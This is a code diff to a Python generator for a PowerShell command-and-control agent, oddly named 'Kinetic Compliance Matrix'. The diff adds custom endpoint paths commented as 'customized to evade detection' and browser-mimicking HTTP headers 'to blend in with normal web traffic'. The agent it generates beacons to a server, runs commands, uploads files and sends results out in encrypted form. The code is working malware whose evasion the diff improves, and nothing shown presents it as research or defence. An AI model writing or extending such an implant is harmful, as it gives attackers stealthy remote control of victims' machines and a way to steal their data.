@@ -3,8 +3,16 @@ import base64
 import os
 import json
 
-def generate_agent_code(key_base64, server_address):
-    """Generate PowerShell agent code with identity collection"""
+def generate_agent_code(key_base64, server_address, beacon_path="/beacon", cmd_result_path="/command_result", file_upload_path="/file_upload"):
+    """Generate PowerShell agent code with identity collection and custom paths"""
+    # Ensure all paths have leading slashes
+    if not beacon_path.startswith('/'):
+        beacon_path = '/' + beacon_path
+    if not cmd_result_path.startswith('/'):
+        cmd_result_path = '/' + cmd_result_path
+    if not file_upload_path.startswith('/'):
+        file_upload_path = '/' + file_upload_path
+        
     agent_code = f"""
 # Kinetic Compliance Matrix - PowerShell Agent
 # This agent contains encryption functionality and system identification
@@ -17,6 +25,11 @@ $key = [System.Convert]::FromBase64String('{key_base64}')
 
 # Server details
 $serverAddress = '{server_address}'
+
+# Endpoint paths - customized to evade detection
+$beaconPath = '{beacon_path}'
+$commandResultPath = '{cmd_result_path}'
+$fileUploadPath = '{file_upload_path}'
 
 # Function to encrypt data for C2 communication
 function Encrypt-Data {{
@@ -143,9 +156,9 @@ function Get-SystemIdentification {{
 
 # Main agent loop
 function Start-AgentLoop {{
-    $beaconUrl = "http://$serverAddress/beacon"
-    $commandResultUrl = "http://$serverAddress/command_result"
-    $uploadUrl = "http://$serverAddress/file_upload"
+    $beaconUrl = "http://$serverAddress$beaconPath"
+    $commandResultUrl = "http://$serverAddress$commandResultPath"
+    $uploadUrl = "http://$serverAddress$fileUploadPath"
     $beaconInterval = 5  # Seconds
     
     # Get system information for identification
@@ -165,6 +178,11 @@ function Start-AgentLoop {{
             if ($systemInfoObj.ClientId) {{
                 $webClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
             }}
+            
+            # Add legitimate-looking headers to blend in with normal web traffic
+            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+            $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+            $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
             
             # Beacon to the C2 server
             $encryptedResponse = $webClient.DownloadString($beaconUrl)
@@ -205,6 +223,8 @@ function Start-AgentLoop {{
                                 $uploadClient = New-Object System.Net.WebClient
                                 $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                                 $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+                                $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+                                $uploadClient.Headers.Add("Content-Type", "application/json")
                                 $uploadClient.UploadString($uploadUrl, $encryptedFileInfo)
                                 
                                 $result = "File uploaded: $fileName"
@@ -233,6 +253,8 @@ function Start-AgentLoop {{
                         $resultClient = New-Object System.Net.WebClient
                         $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                         $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+                        $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+                        $resultClient.Headers.Add("Content-Type", "application/json")
                         $resultClient.UploadString($commandResultUrl, $encryptedResult)
                     }}
                     catch {{
@@ -248,6 +270,8 @@ function Start-AgentLoop {{
                         $resultClient = New-Object System.Net.WebClient
                         $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                         $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+                        $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+                        $resultClient.Headers.Add("Content-Type", "application/json")
                         $resultClient.UploadString($commandResultUrl, $encryptedResult)
                     }}
                 }}
